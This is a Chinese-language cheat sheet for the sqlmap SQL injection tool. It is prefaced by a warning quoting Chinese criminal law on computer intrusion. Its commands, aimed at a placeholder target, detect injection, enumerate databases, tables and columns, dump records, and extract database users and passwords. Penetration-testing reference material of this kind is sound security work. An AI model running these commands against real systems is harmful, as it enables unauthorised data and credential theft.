# SQLMAP

!!! warning "《中华人民共和国刑法》"
	第二百八十五条　【非法侵入计算机信息系统罪】违反国家规定，侵入国家事务、国防建设、尖端科学技术领域的计算机信息系统的，处三年以下有期徒刑或者拘役。
	
	【非法获取计算机信息系统数据、非法控制计算机信息系统罪】违反国家规定，侵入前款规定以外的计算机信息系统或者采用其他技术手段，获取该计算机信息系统中存储、处理或者传输的数据，或者对该计算机信息系统实施非法控制，情节严重的，处三年以下有期徒刑或者拘役，并处或者单处罚金；情节特别严重的，处三年以上七年以下有期徒刑，并处罚金。

	【提供侵入、非法控制计算机信息系统程序、工具罪】提供专门用于侵入、非法控制计算机信息系统的程序、工具，或者明知他人实施侵入、非法控制计算机信息系统的违法犯罪行为而为其提供程序、工具，情节严重的，依照前款的规定处罚。

	第二百八十六条　【破坏计算机信息系统罪】违反国家规定，对计算机信息系统功能进行删除、修改、增加、干扰，造成计算机信息系统不能正常运行，后果严重的，处五年以下有期徒刑或者拘役；后果特别严重的，处五年以上有期徒刑。
	
	违反国家规定，对计算机信息系统中存储、处理或者传输的数据和应用程序进行删除、修改、增加的操作，后果严重的，依照前款的规定处罚。
	
	故意制作、传播计算机病毒等破坏性程序，影响计算机系统正常运行，后果严重的，依照第一款的规定处罚。

## 基本命令

### 判断是否存在注入

直接判断：

```shell
sqlmap.py -u "http://tar.get/?id=1"
```

从 HTTP 请求判断：

```shell
sqlmap.py -r http_request.txt
```

### 获取当前网站数据库的名称

```shell
sqlmap.py -u "http://tar.get/?id=1" --current-db
```

### 查询当前用户下的所有数据库

```shell
sqlmap.py -u "http://tar.get/?id=1" --dbs
```

### 查询数据库的表名

```shell
sqlmap.py -u "http://tar.get/?id=1" -D databaseName --tables
sqlmap.py -u "http://tar.get/?id=1" -D databaseName -T # abbr
```

### 查询表里面的字段名

```shell
sqlmap.py -u "http://tar.get/?id=1" -D databaseName -T tableName --columns
sqlmap.py -u "http://tar.get/?id=1" -D databaseName -T tableName -C # abbr
```

### 查询表里面的字段的值

```shell
sqlmap.py -u "http://tar.get/?id=1" -D databaseName -T tableName -C recordName --dump
```

### 获取数据库的所有用户

```shell
sqlmap.py -u "http://tar.get/?id=1" --users
```

### 获取数据库用户的密码

```shell
sqlmap.py -u "http://tar.get/?id=1" --passwords
```
